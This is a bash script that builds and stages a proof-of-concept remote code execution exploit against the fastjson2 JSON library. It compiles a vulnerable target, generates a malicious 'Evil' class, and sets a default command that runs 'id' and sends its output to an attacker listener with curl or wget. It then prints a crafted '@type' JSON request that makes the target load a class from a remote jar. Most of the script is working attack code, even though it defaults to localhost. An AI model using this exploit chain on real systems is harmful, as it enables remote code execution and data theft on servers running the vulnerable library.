#!/bin/bash
# Build fastjson2 ObjectReaderSeeAlso RCE (no hash collision needed)
# 用法: bash scripts/build.sh [LHOST] [LPORT] [CMD]
set -e; cd "$(dirname "$0")/.."
LHOST="${1:-127.0.0.1}"; LPORT="${2:-18080}"; CMD="${3:-id-oob}"

JAVA_HOME=/home/VCPchat1/.gradle/jdks/jdk8u432 2>/dev/null || JAVA_HOME=$(dirname $(dirname $(readlink -f $(which java))))
export JAVA_HOME; export PATH=$JAVA_HOME/bin:$PATH
MVN=mvn; [ -x /home/VCPchat1/.local/opt/maven/bin/mvn ] && MVN=/home/VCPchat1/.local/opt/maven/bin/mvn

echo "[*] LHOST=$LHOST LPORT=$LPORT"

# Phase 1: Build target
echo "[*] Building target..."
$MVN package -DskipTests -q -Dmaven.repo.local=/tmp/m2-repo 2>/dev/null
echo "[+] target/fastjson-rce-env-1.0.0.jar"

# Phase 2: Deps
mkdir -p poc/lib poc/www
[ -f poc/lib/asm-9.6.jar ] || curl -sL -o poc/lib/asm-9.6.jar https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar

# Phase 3: Payload (Evil extends Animal for isAssignableFrom check)
if [ "$CMD" = "id-oob" ]; then
    CMD="id 2>&1 | { curl -fsS -X POST --data-binary @- http://$LHOST:$LPORT/out || wget -qO- --post-file=- http://$LHOST:$LPORT/out; }"
fi
echo "[*] Generating payload (Evil extends Animal)..."
javac -cp poc/lib/asm-9.6.jar -d poc poc/GenPayload.java
java -cp poc:poc/lib/asm-9.6.jar GenPayload "$LHOST" "$LPORT" "$CMD"

DEC=$(python3 -c "import socket,struct; print(struct.unpack('!I',socket.inet_aton('$LHOST'))[0])" 2>/dev/null || echo "DECIMAL_IP")
echo "==============================
  java -jar target/fastjson-rce-env-1.0.0.jar --server.port=8080 &
  python3 poc/server.py 0.0.0.0 $LPORT &
  curl -X POST http://127.0.0.1:8080/parseAnimal \\
    -H 'Content-Type: application/json' \\
    -d '{\"@type\":\"jar:http:..${DEC}:${LPORT}.exploit!.Evil\"}'
=============================="
